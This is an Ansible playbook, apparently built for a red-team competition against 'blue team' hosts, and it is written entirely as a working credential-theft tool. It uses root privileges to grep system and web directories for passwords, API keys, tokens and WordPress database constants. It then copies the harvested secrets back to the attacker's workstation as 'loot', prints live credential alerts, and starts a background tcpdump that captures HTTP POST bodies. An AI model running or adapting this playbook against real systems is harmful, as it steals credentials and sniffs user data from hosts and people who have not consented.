---
# PHASE 1: Internal File Scrubbing (Run on Blue Team Boxes)
- name: Targeted Secret Extraction
  become: yes  # Critical for reading protected /etc and /var/www/html files
  shell: |
    # Matches common assignment patterns: pass=, password:, DB_PASSWORD, etc.
    grep -rEho "(password|passwd|db_p[^\s=]+|api_key|token)[:=]\s*['\"][^'\"]+['\"]|[:=]\s*[a-zA-Z0-9!@#$%^&*]{8,20}" /etc /var/www /opt 2>/dev/null | sort -u
  register: config_secrets
  failed_when: false
  changed_when: false

- name: Specific Web/DB Constant Extraction
  become: yes
  shell: |
    # Specifically targets PHP 'define' style strings often used in WordPress
    grep -rEho "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null
  register: web_secrets
  failed_when: false
  changed_when: false

# PHASE 2: Exfiltration (Deliver to Red Workstation)
- name: Deliver Harvested Data to Local Loot
  delegate_to: localhost
  copy:
    content: |
      === HARVEST REPORT: {{ inventory_hostname }} ===
      
      [CONFIG FILE SECRETS]
      {{ config_secrets.stdout if config_secrets.stdout != "" else "No matches found." }}

      [WEB APP CONSTANTS]
      {{ web_secrets.stdout if web_secrets.stdout != "" else "No matches found." }}
    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/harvest_results.txt"
  become: no

# PHASE 3: The Live Feed (Instant Terminal Alert)
- name: "LIVE CREDS ALERT: {{ inventory_hostname }}"
  debug:
    msg: 
      - "Configs: {{ config_secrets.stdout_lines | default(['None']) }}"
      - "Web/DB: {{ web_secrets.stdout_lines | default(['None']) }}"
  when: (config_secrets.stdout != "") or (web_secrets.stdout != "")

# PHASE 4: Network Sniffing (Run ONCE in background)
- name: Start Background Network Sniffer
  delegate_to: localhost
  shell: |
    nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
  run_once: true
  become: yes